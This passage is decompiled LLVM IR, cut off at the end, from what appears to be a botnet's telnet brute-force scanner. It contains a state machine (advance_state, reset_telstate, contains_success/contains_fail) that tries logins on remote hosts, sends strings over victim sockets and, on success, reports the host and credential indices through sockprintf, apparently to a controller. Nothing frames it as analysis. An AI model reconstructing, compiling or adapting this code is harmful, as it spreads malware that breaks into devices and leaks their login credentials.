  br i1 %v1_804d545, label %dec_label_pc_804d730, label %dec_label_pc_804d54d

dec_label_pc_804d54d:                             ; preds = %dec_label_pc_804d4f5
  store i32 %storemerge45, i32* @ebx, align 4
  %v1_804d553 = add i32 %v0_804d542, 16
  %v2_804d553 = inttoptr i32 %v1_804d553 to i32*
  store i32 0, i32* %v2_804d553, align 4
  %v1_804d555 = inttoptr i32 %stack_var_-624.243 to i32*
  %v2_804d555 = call i32 @__GI_time(i32* %v1_804d555)
  store i32 %v2_804d555, i32* @esi, align 4
  %v0_804d562 = load i32, i32* @ebx, align 4
  %v2_804d572 = mul i32 %v0_804d562, 28
  %v1_804d576 = add i32 %v2_804d574, %v2_804d572
  %v2_804d579 = inttoptr i32 %v1_804d576 to i32*
  store i32 %v2_804d555, i32* %v2_804d579, align 4
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v1_804d50d, i32* %eax.global-to-local, align 4
  %v2_804d596 = load i32, i32* %v1_804d510, align 4
  store i32 %v2_804d596, i32* %eax.global-to-local, align 4
  %v0_804d598 = load i32, i32* @esp, align 4
  %v2_804d59b = add i32 %v0_804d598, -16
  %v3_804d59b = inttoptr i32 %v2_804d59b to i32*
  store i32 %v2_804d596, i32* %v3_804d59b, align 4
  %v1_804d59c = call i32 @contains_fail(i32 %stack_var_-624.243)
  store i32 %v1_804d59c, i32* %eax.global-to-local, align 4
  %v0_804d5a1 = load i32, i32* @esp, align 4
  %v1_804d5a4 = icmp eq i32 %v1_804d59c, 0
  store i32 %v1_804c9ae, i32* @edx, align 4
  br i1 %v1_804d5a4, label %dec_label_pc_804d5d4, label %dec_label_pc_804d5a8

dec_label_pc_804d5a8:                             ; preds = %dec_label_pc_804d54d
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v1_804d5c4 = add i32 %v0_804d5a1, 4
  %v2_804d5c4 = inttoptr i32 %v1_804d5c4 to i32*
  store i32 0, i32* %v2_804d5c4, align 4
  %v0_804d5c6 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d5c6 = inttoptr i32 %v0_804d5a1 to i32*
  store i32 %v0_804d5c6, i32* %v3_804d5c6, align 4
  %v3_804d5c7 = call i32 @advance_state(i32* %v1_804d555, i32 %stack_var_-620.244)
  store i32 %v3_804d5c7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d5d4:                             ; preds = %dec_label_pc_804d54d
  store i32 %v1_804d50d, i32* %eax.global-to-local, align 4
  %v2_804d5ef = load i32, i32* %v1_804d510, align 4
  store i32 %v2_804d5ef, i32* %eax.global-to-local, align 4
  %v3_804d5f4 = inttoptr i32 %v0_804d5a1 to i32*
  store i32 %v2_804d5ef, i32* %v3_804d5f4, align 4
  %v1_804d5f5 = call i32 @contains_success(i32 %stack_var_-624.243)
  store i32 %v1_804d5f5, i32* %eax.global-to-local, align 4
  %v0_804d5fa = load i32, i32* @esp, align 4
  %v1_804d5fd = icmp eq i32 %v1_804d5f5, 0
  store i32 %v1_804c9ae, i32* @edx, align 4
  br i1 %v1_804d5fd, label %dec_label_pc_804d706, label %dec_label_pc_804d605

dec_label_pc_804d605:                             ; preds = %dec_label_pc_804d5d4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804d61b = add i32 %v2_804ca50, %v2_804c9bc
  %v4_804d61b = inttoptr i32 %v3_804d61b to i8*
  %v5_804d61b = load i8, i8* %v4_804d61b, align 1
  %v6_804d61b = zext i8 %v5_804d61b to i32
  %v9_804d61b = or i32 %v6_804d61b, %v8_804ca0d
  store i32 %v9_804d61b, i32* %eax.global-to-local, align 4
  %v10_804d61f = icmp eq i8 %v5_804d61b, 2
  %v1_804d621 = icmp eq i1 %v10_804d61f, false
  store i32 %v1_804c9ae, i32* @edx, align 4
  br i1 %v1_804d621, label %dec_label_pc_804d64f, label %dec_label_pc_804d623

dec_label_pc_804d623:                             ; preds = %dec_label_pc_804d605
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v1_804d63f = add i32 %v0_804d5fa, 4
  %v2_804d63f = inttoptr i32 %v1_804d63f to i32*
  store i32 7, i32* %v2_804d63f, align 4
  %v0_804d641 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d641 = inttoptr i32 %v0_804d5fa to i32*
  store i32 %v0_804d641, i32* %v3_804d641, align 4
  %v3_804d642 = call i32 @advance_state(i32* %v1_804d555, i32 %stack_var_-620.244)
  store i32 %v3_804d642, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d64f:                             ; preds = %dec_label_pc_804d605
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804d665 = add i32 %v2_804cb3f, %v2_804c9bc
  %v4_804d665 = inttoptr i32 %v3_804d665 to i8*
  %v5_804d665 = load i8, i8* %v4_804d665, align 1
  %v6_804d665 = zext i8 %v5_804d665 to i32
  store i32 %v6_804d665, i32* %eax.global-to-local, align 4
  %v1_804d66e = mul nuw nsw i32 %v6_804d665, 4
  %v2_804d66e = add nuw nsw i32 %v1_804d66e, 134590900
  %v3_804d66e = inttoptr i32 %v2_804d66e to i32*
  %v4_804d66e = load i32, i32* %v3_804d66e, align 4
  store i32 %v4_804d66e, i32* @ebx, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804d68b = add i32 %v2_804cb79, %v2_804c9bc
  %v4_804d68b = inttoptr i32 %v3_804d68b to i8*
  %v5_804d68b = load i8, i8* %v4_804d68b, align 2
  %v6_804d68b = zext i8 %v5_804d68b to i32
  store i32 %v6_804d68b, i32* %eax.global-to-local, align 4
  %v1_804d694 = mul nuw nsw i32 %v6_804d68b, 4
  %v2_804d694 = add nuw nsw i32 %v1_804d694, 134590884
  %v3_804d694 = inttoptr i32 %v2_804d694 to i32*
  %v4_804d694 = load i32, i32* %v3_804d694, align 4
  store i32 %v4_804d694, i32* @esi, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v3_804d6b7 = inttoptr i32 %v0_804d5fa to i32*
  store i32 %v2_804c9be, i32* %v3_804d6b7, align 4
  %v0_804d6b8 = call i32 @get_telstate_host()
  store i32 %v0_804d6b8, i32* %eax.global-to-local, align 4
  %v0_804d6bd = load i32, i32* @esp, align 4
  %v0_804d6c0 = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_804d6c0, i32* %edx.global-to-local, align 4
  %v0_804d6c9 = load i32, i32* @ebx, align 4
  %v3_804d6c9 = inttoptr i32 %v0_804d6bd to i32*
  store i32 %v0_804d6c9, i32* %v3_804d6c9, align 4
  %v0_804d6ca = load i32, i32* @esi, align 4
  %v2_804d6ca = add i32 %v0_804d6bd, -4
  %v3_804d6ca = inttoptr i32 %v2_804d6ca to i32*
  store i32 %v0_804d6ca, i32* %v3_804d6ca, align 4
  %v2_804d6cb = add i32 %v0_804d6bd, -8
  %v3_804d6cb = inttoptr i32 %v2_804d6cb to i32*
  store i32 %v0_804d6b8, i32* %v3_804d6cb, align 4
  %v1_804d6cc = add i32 %v0_804d6bd, -12
  %v2_804d6cc = inttoptr i32 %v1_804d6cc to i32*
  store i32 ptrtoint ([23 x i8]* @global_var_80584d9.253 to i32), i32* %v2_804d6cc, align 4
  %v0_804d6d1 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d6d1 = add i32 %v0_804d6bd, -16
  %v3_804d6d1 = inttoptr i32 %v2_804d6d1 to i32*
  store i32 %v0_804d6d1, i32* %v3_804d6d1, align 4
  %v2_804d6d2 = call i32 @sockprintf(i32 %stack_var_-624.243, i32 %stack_var_-620.244)
  %v0_804d6d7 = load i32, i32* @esp, align 4
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v1_804d6f6 = add i32 %v0_804d6d7, 20
  %v2_804d6f6 = inttoptr i32 %v1_804d6f6 to i32*
  store i32 7, i32* %v2_804d6f6, align 4
  %v0_804d6f8 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d6f8 = add i32 %v0_804d6d7, 16
  %v3_804d6f8 = inttoptr i32 %v2_804d6f8 to i32*
  store i32 %v0_804d6f8, i32* %v3_804d6f8, align 4
  %v3_804d6f9 = call i32 @advance_state(i32* %v1_804d555, i32 %stack_var_-620.244)
  store i32 %v3_804d6f9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d706:                             ; preds = %dec_label_pc_804d5d4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v3_804d722 = inttoptr i32 %v0_804d5fa to i32*
  store i32 %v2_804c9be, i32* %v3_804d722, align 4
  %v1_804d723 = call i32 @reset_telstate(i32 %stack_var_-624.243)
  store i32 %v1_804d723, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d730:                             ; preds = %dec_label_pc_804d4f5
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v1_804c9c0, i32* %eax.global-to-local, align 4
  %v2_804d74b = load i32, i32* %v1_804c9c3, align 4
  store i32 %v2_804d74b, i32* %eax.global-to-local, align 4
  %v1_804d74d = add i32 %v2_804d74b, 7
  store i32 %v1_804d74d, i32* @ebx, align 4
  %v1_804d753 = add i32 %v0_804d542, 16
  %v2_804d753 = inttoptr i32 %v1_804d753 to i32*
  store i32 0, i32* %v2_804d753, align 4
  %v1_804d755 = inttoptr i32 %stack_var_-624.243 to i32*
  %v2_804d755 = call i32 @__GI_time(i32* %v1_804d755)
  store i32 %v2_804d755, i32* %eax.global-to-local, align 4
  %v0_804d75d = load i32, i32* @ebx, align 4
  %v7_804d75d = icmp ult i32 %v0_804d75d, %v2_804d755
  %v1_804d75f = icmp eq i1 %v7_804d75d, false
  br i1 %v1_804d75f, label %dec_label_pc_804d8eb, label %dec_label_pc_804d765

dec_label_pc_804d765:                             ; preds = %dec_label_pc_804d730
  %v0_804d75a = load i32, i32* @esp, align 4
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v3_804d781 = inttoptr i32 %v0_804d75a to i32*
  store i32 %v2_804c9be, i32* %v3_804d781, align 4
  %v1_804d782 = call i32 @reset_telstate(i32 %stack_var_-624.243)
  store i32 %v1_804d782, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d78f:                             ; preds = %dec_label_pc_804c9f7
  store i32 %storemerge45, i32* @ebx, align 4
  %v0_804d792 = load i32, i32* @esp, align 4
  %v1_804d795 = add i32 %v0_804d792, -16
  %v2_804d795 = inttoptr i32 %v1_804d795 to i32*
  store i32 0, i32* %v2_804d795, align 4
  %v1_804d797 = inttoptr i32 %v6_804ca0d to i32*
  %v2_804d797 = call i32 @__GI_time(i32* %v1_804d797)
  %v0_804d7a4 = load i32, i32* @ebx, align 4
  %v2_804d7b4 = mul i32 %v0_804d7a4, 28
  %v1_804d7b8 = add i32 %v2_804d574, %v2_804d7b4
  %v2_804d7bb = inttoptr i32 %v1_804d7b8 to i32*
  store i32 %v2_804d797, i32* %v2_804d7bb, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804d7d3 = inttoptr i32 %v2_804c9be to i32*
  %v4_804d7d3 = load i32, i32* %v3_804d7d3, align 4
  store i32 %v4_804d7d3, i32* %eax.global-to-local, align 4
  %v0_804d7d6 = load i32, i32* @esp, align 4
  %v1_804d7d6 = add i32 %v0_804d7d6, -4
  %v2_804d7d6 = inttoptr i32 %v1_804d7d6 to i32*
  store i32 16384, i32* %v2_804d7d6, align 4
  %v1_804d7db = add i32 %v0_804d7d6, -8
  %v2_804d7db = inttoptr i32 %v1_804d7db to i32*
  store i32 4, i32* %v2_804d7db, align 4
  %v1_804d7dd = add i32 %v0_804d7d6, -12
  %v2_804d7dd = inttoptr i32 %v1_804d7dd to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80584f0.254 to i32), i32* %v2_804d7dd, align 4
  %v0_804d7e2 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d7e2 = add i32 %v0_804d7d6, -16
  %v3_804d7e2 = inttoptr i32 %v2_804d7e2 to i32*
  store i32 %v0_804d7e2, i32* %v3_804d7e2, align 4
  %v4_804d7e3 = call i32 @__libc_send(i32 %stack_var_-624.243, i32 %stack_var_-620.244, i32 %v2_804c8c7, i32 %v6_804ca0d)
  %v0_804d7e8 = load i32, i32* @esp, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v4_804d801 = load i32, i32* %v3_804d7d3, align 4
  store i32 %v4_804d801, i32* %eax.global-to-local, align 4
  %v1_804d804 = add i32 %v0_804d7e8, 12
  %v2_804d804 = inttoptr i32 %v1_804d804 to i32*
  store i32 16384, i32* %v2_804d804, align 4
  %v1_804d809 = add i32 %v0_804d7e8, 8
  %v2_804d809 = inttoptr i32 %v1_804d809 to i32*
  store i32 7, i32* %v2_804d809, align 4
  %v1_804d80b = add i32 %v0_804d7e8, 4
  %v2_804d80b = inttoptr i32 %v1_804d80b to i32*
  store i32 ptrtoint ([8 x i8]* @global_var_80584f5.255 to i32), i32* %v2_804d80b, align 4
  %v0_804d810 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d810 = inttoptr i32 %v0_804d7e8 to i32*
  store i32 %v0_804d810, i32* %v3_804d810, align 4
  %v4_804d811 = call i32 @__libc_send(i32 %stack_var_-624.243, i32 %stack_var_-620.244, i32 %v2_804c8c7, i32 %v6_804ca0d)
  %v0_804d819 = load i32, i32* bitcast ([9 x i8*]* @global_var_805b1a0.262 to i32*), align 32
  %v5_804d823 = inttoptr i32 %v0_804d819 to i8*
  %v1_804d829 = and i32 %v0_804d819, -256
  store i32 %v1_804d829, i32* %eax.global-to-local, align 4
  store i32 %v0_804d819, i32* @edi, align 4
  %v3_804d832 = call i32 @_strlen(i8* %v5_804d823)
  store i32 %v3_804d832, i32* @ebx, align 4
  %v0_804d83b = load i32, i32* bitcast ([9 x i8*]* @global_var_805b1a0.262 to i32*), align 32
  store i32 %v0_804d83b, i32* @esi, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v4_804d857 = load i32, i32* %v3_804d7d3, align 4
  store i32 %v4_804d857, i32* %eax.global-to-local, align 4
  %v0_804d85a = load i32, i32* @esp, align 4
  %v1_804d85a = add i32 %v0_804d85a, -4
  %v2_804d85a = inttoptr i32 %v1_804d85a to i32*
  store i32 16384, i32* %v2_804d85a, align 4
  %v0_804d85f = load i32, i32* @ebx, align 4
  %v2_804d85f = add i32 %v0_804d85a, -8
  %v3_804d85f = inttoptr i32 %v2_804d85f to i32*
  store i32 %v0_804d85f, i32* %v3_804d85f, align 4
  %v0_804d860 = load i32, i32* @esi, align 4
  %v2_804d860 = add i32 %v0_804d85a, -12
  %v3_804d860 = inttoptr i32 %v2_804d860 to i32*
  store i32 %v0_804d860, i32* %v3_804d860, align 4
  %v0_804d861 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d861 = add i32 %v0_804d85a, -16
  %v3_804d861 = inttoptr i32 %v2_804d861 to i32*
  store i32 %v0_804d861, i32* %v3_804d861, align 4
  %v5_804d862 = call i32 @__libc_send(i32 %v0_804d819, i32 %stack_var_-624.243, i32 %stack_var_-620.244, i32 %v2_804c8c7)
  store i32 %v5_804d862, i32* %eax.global-to-local, align 4
  %v0_804d867 = load i32, i32* @esp, align 4
  %v2_804d86a = icmp slt i32 %v5_804d862, 0
  %v1_804d86c = icmp eq i1 %v2_804d86a, false
  store i32 %v1_804c9ae, i32* @edx, align 4
  br i1 %v1_804d86c, label %dec_label_pc_804d895, label %dec_label_pc_804d86e

dec_label_pc_804d86e:                             ; preds = %dec_label_pc_804d78f
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v3_804d88a = inttoptr i32 %v0_804d867 to i32*
  store i32 %v2_804c9be, i32* %v3_804d88a, align 4
  %v2_804d88b = call i32 @reset_telstate(i32 %v0_804d819)
  store i32 %v2_804d88b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d895:                             ; preds = %dec_label_pc_804d78f
  store i32 %v1_804c9c0, i32* %eax.global-to-local, align 4
  %v2_804d8b0 = load i32, i32* %v1_804c9c3, align 4
  store i32 %v2_804d8b0, i32* %eax.global-to-local, align 4
  %v1_804d8b2 = add i32 %v2_804d8b0, 25
  store i32 %v1_804d8b2, i32* @ebx, align 4
  %v2_804d8b8 = inttoptr i32 %v0_804d867 to i32*
  store i32 0, i32* %v2_804d8b8, align 4
  %tmp39 = inttoptr i32 %v0_804d819 to i32*
  %v3_804d8ba = call i32 @__GI_time(i32* %tmp39)
  store i32 %v3_804d8ba, i32* %eax.global-to-local, align 4
  %v0_804d8c2 = load i32, i32* @ebx, align 4
  %v7_804d8c2 = icmp ult i32 %v0_804d8c2, %v3_804d8ba
  %v1_804d8c4 = icmp eq i1 %v7_804d8c2, false
  br i1 %v1_804d8c4, label %dec_label_pc_804d8eb, label %dec_label_pc_804d8c6

dec_label_pc_804d8c6:                             ; preds = %dec_label_pc_804d895
  %v0_804d8bf = load i32, i32* @esp, align 4
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v3_804d8e2 = inttoptr i32 %v0_804d8bf to i32*
  store i32 %v2_804c9be, i32* %v3_804d8e2, align 4
  %v2_804d8e3 = call i32 @reset_telstate(i32 %v0_804d819)
  store i32 %v2_804d8e3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d8eb:                             ; preds = %dec_label_pc_804c9f7, %dec_label_pc_804d895, %dec_label_pc_804d730, %dec_label_pc_804d34e, %dec_label_pc_804d0ca, %dec_label_pc_804cf8e, %dec_label_pc_804cc17, %dec_label_pc_804d86e, %dec_label_pc_804d765, %dec_label_pc_804d706, %dec_label_pc_804d64f, %dec_label_pc_804d623, %dec_label_pc_804d5a8, %dec_label_pc_804d4c9, %dec_label_pc_804d49f, %dec_label_pc_804d443, %dec_label_pc_804d383, %dec_label_pc_804d322, %dec_label_pc_804d2f6, %dec_label_pc_804d245, %dec_label_pc_804d21b, %dec_label_pc_804d1bf, %dec_label_pc_804d0ff, %dec_label_pc_804d09e, %dec_label_pc_804d072, %dec_label_pc_804cfc3, %dec_label_pc_804cf64, %dec_label_pc_804cedc, %dec_label_pc_804ceb2, %dec_label_pc_804cd7c, %dec_label_pc_804cd52, %dec_label_pc_804cbf7, %dec_label_pc_804cbb9, %dec_label_pc_804d8c6
  %stack_var_-624.1 = phi i32 [ %stack_var_-624.243, %dec_label_pc_804c9f7 ], [ %stack_var_-624.243, %dec_label_pc_804d895 ], [ %stack_var_-624.243, %dec_label_pc_804d8c6 ], [ %stack_var_-624.243, %dec_label_pc_804d86e ], [ %stack_var_-624.243, %dec_label_pc_804d730 ], [ %stack_var_-624.243, %dec_label_pc_804d765 ], [ %stack_var_-624.243, %dec_label_pc_804d706 ], [ %stack_var_-624.243, %dec_label_pc_804d64f ], [ %stack_var_-624.243, %dec_label_pc_804d623 ], [ %stack_var_-624.243, %dec_label_pc_804d5a8 ], [ %v4_804d3cc, %dec_label_pc_804d4c9 ], [ %v4_804d3cc, %dec_label_pc_804d49f ], [ %v4_804d3cc, %dec_label_pc_804d443 ], [ %stack_var_-624.243, %dec_label_pc_804d34e ], [ %stack_var_-624.243, %dec_label_pc_804d383 ], [ %stack_var_-624.243, %dec_label_pc_804d322 ], [ %stack_var_-624.243, %dec_label_pc_804d2f6 ], [ %stack_var_-624.243, %dec_label_pc_804d245 ], [ %stack_var_-624.243, %dec_label_pc_804d21b ], [ %stack_var_-624.243, %dec_label_pc_804d1bf ], [ %stack_var_-624.243, %dec_label_pc_804d0ca ], [ %stack_var_-624.243, %dec_label_pc_804d0ff ], [ %stack_var_-624.243, %dec_label_pc_804d09e ], [ %stack_var_-624.243, %dec_label_pc_804d072 ], [ %stack_var_-624.243, %dec_label_pc_804cf8e ], [ %stack_var_-624.243, %dec_label_pc_804cfc3 ], [ %stack_var_-624.243, %dec_label_pc_804cf64 ], [ %stack_var_-624.243, %dec_label_pc_804cedc ], [ %stack_var_-624.243, %dec_label_pc_804ceb2 ], [ %stack_var_-624.243, %dec_label_pc_804cc17 ], [ %stack_var_-624.243, %dec_label_pc_804cd7c ], [ %stack_var_-624.243, %dec_label_pc_804cd52 ], [ %stack_var_-624.243, %dec_label_pc_804cbf7 ], [ %stack_var_-624.243, %dec_label_pc_804cbb9 ]
  %stack_var_-620.1 = phi i32 [ %stack_var_-620.244, %dec_label_pc_804c9f7 ], [ %stack_var_-620.244, %dec_label_pc_804d895 ], [ %stack_var_-620.244, %dec_label_pc_804d8c6 ], [ %stack_var_-620.244, %dec_label_pc_804d86e ], [ %stack_var_-620.244, %dec_label_pc_804d730 ], [ %stack_var_-620.244, %dec_label_pc_804d765 ], [ %stack_var_-620.244, %dec_label_pc_804d706 ], [ %stack_var_-620.244, %dec_label_pc_804d64f ], [ %stack_var_-620.244, %dec_label_pc_804d623 ], [ %stack_var_-620.244, %dec_label_pc_804d5a8 ], [ %stack_var_-620.244, %dec_label_pc_804d4c9 ], [ %stack_var_-620.244, %dec_label_pc_804d49f ], [ %stack_var_-620.244, %dec_label_pc_804d443 ], [ %stack_var_-620.244, %dec_label_pc_804d34e ], [ %stack_var_-620.244, %dec_label_pc_804d383 ], [ %stack_var_-620.244, %dec_label_pc_804d322 ], [ %stack_var_-620.244, %dec_label_pc_804d2f6 ], [ %v4_804d148, %dec_label_pc_804d245 ], [ %v4_804d148, %dec_label_pc_804d21b ], [ %v4_804d148, %dec_label_pc_804d1bf ], [ %stack_var_-620.244, %dec_label_pc_804d0ca ], [ %stack_var_-620.244, %dec_label_pc_804d0ff ], [ %stack_var_-620.244, %dec_label_pc_804d09e ], [ %stack_var_-620.244, %dec_label_pc_804d072 ], [ %stack_var_-620.244, %dec_label_pc_804cf8e ], [ %stack_var_-620.244, %dec_label_pc_804cfc3 ], [ %stack_var_-620.244, %dec_label_pc_804cf64 ], [ %stack_var_-620.244, %dec_label_pc_804cedc ], [ %stack_var_-620.244, %dec_label_pc_804ceb2 ], [ %stack_var_-620.244, %dec_label_pc_804cc17 ], [ %stack_var_-620.244, %dec_label_pc_804cd7c ], [ %stack_var_-620.244, %dec_label_pc_804cd52 ], [ %stack_var_-620.244, %dec_label_pc_804cbf7 ], [ %stack_var_-620.244, %dec_label_pc_804cbb9 ]
  %v4_804d8eb = add nuw nsw i32 %storemerge45, 1
  store i32 %v4_804d8eb, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804d8eb, %arg2
  br i1 %exitcond, label %dec_label_pc_804c99c, label %dec_label_pc_804c9a8

; uselistorder directives
  uselistorder i32 %v4_804d8eb, { 1, 2, 0 }
  uselistorder i32 %stack_var_-620.1, { 1, 0 }
  uselistorder i32 %stack_var_-624.1, { 1, 0 }
  uselistorder i32 %v0_804d7e8, { 3, 0, 1, 2 }
  uselistorder i32 %v0_804d5fa, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804d5a1, { 1, 2, 0 }
  uselistorder i32* %v1_804d555, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804d498, { 1, 0, 2 }
  uselistorder i32 %v0_804d43c, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v4_804d3cc, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_804d33e, { 1, 0 }
  uselistorder i32 %v0_804d2ef, { 1, 2, 0 }
  uselistorder i32 %v0_804d214, { 1, 0, 2 }
  uselistorder i32 %v0_804d1b8, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v4_804d148, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_804d0ba, { 1, 0 }
  uselistorder i32 %v0_804d06b, { 1, 2, 0 }
  uselistorder i32 %v0_804cf2f, { 1, 0 }
  uselistorder i32 %v13_804cf07, { 1, 0 }
  uselistorder i32 %v0_804cf02, { 2, 0, 1 }
  uselistorder i32 %v0_804ce4d, { 0, 1, 6, 2, 3, 4, 5 }
  uselistorder i32 %v5_804ce48, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v1_804cdf8, { 1, 0 }
  uselistorder i32 %v2_804cddc, { 1, 0 }
  uselistorder i32 %v0_804cd95, { 1, 0 }
  uselistorder i32 %v0_804cd10, { 2, 0, 1 }
  uselistorder i32 %v12_804cce8, { 1, 0 }
  uselistorder i32 %v0_804cce3, { 2, 0, 1 }
  uselistorder i32 %v2_804cc65, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %v0_804cc2a, { 2, 0, 1 }
  uselistorder i32 %v2_804ca77, { 1, 0 }
  uselistorder i32 %v6_804ca0d, { 9, 10, 11, 8, 6, 7, 5, 3, 4, 2, 1, 13, 12, 14, 0 }
  uselistorder i32* %v1_804c9c3, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v1_804c9c0, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v2_804c9be, { 49, 50, 51, 52, 53, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 33, 34, 35, 36, 37, 27, 28, 29, 30, 31, 32, 22, 23, 24, 25, 26, 16, 17, 18, 19, 20, 21, 8, 9, 10, 11, 12, 13, 14, 15, 0, 1, 2, 3, 4, 6, 5, 7, 54 }
  uselistorder i32 %v2_804c9bc, { 10, 11, 12, 1, 13, 0, 14, 2, 15, 16, 17, 18, 19, 3, 20, 21, 22, 23, 24, 4, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 6, 40, 5, 41, 42, 7, 43, 45, 8, 44, 9 }
  uselistorder i32 %v1_804c9ae, { 0, 1, 2, 3, 4, 12, 13, 5, 6, 7, 8, 9, 10, 11, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 40, 41, 36, 37, 38, 39, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32 %stack_var_-624.243, { 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 15, 10, 8, 6, 5, 4, 0, 3, 2, 1, 9, 7, 14, 16, 13, 12, 11 }
  uselistorder i32 %stack_var_-620.244, { 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 29, 26, 24, 22, 21, 20, 16, 14, 12, 9, 8, 7, 6, 5, 4, 0, 3, 2, 1, 11, 10, 13, 15, 19, 18, 17, 25, 23, 28, 30, 27 }
  uselistorder i32 %storemerge45, { 0, 3, 4, 5, 6, 8, 7, 1, 2 }
  uselistorder i32 %v4_804c98b, { 1, 2, 0 }
  uselistorder i32 %storemerge251, { 1, 0 }
  uselistorder i32 %v2_804c8e4, { 1, 0 }
  uselistorder i32 %v2_804c8c7, { 14, 13, 12, 16, 15, 17, 18, 21, 20, 19, 5, 6, 7, 8, 22, 1, 2, 3, 4, 9, 0, 10, 11 }
  uselistorder i32 %v1_804c873, { 1, 0, 2 }
  uselistorder i32* %stack_var_-604, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-596, { 4, 3, 2, 1, 0, 5, 6, 7 }
  uselistorder i32* %stack_var_-316, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-324, { 2, 1, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-328, { 4, 3, 5, 1, 0, 2, 6, 7 }
  uselistorder i32* %stack_var_-332, { 6, 0, 9, 8, 4, 5, 10, 2, 1, 7, 11, 3, 12, 13 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 46, 47, 48, 39, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63 }
  uselistorder i32* %eax.global-to-local, { 201, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 77, 78, 81, 79, 80, 82, 83, 76, 84, 85, 86, 87, 88, 89, 91, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 112, 113, 116, 114, 115, 117, 118, 111, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 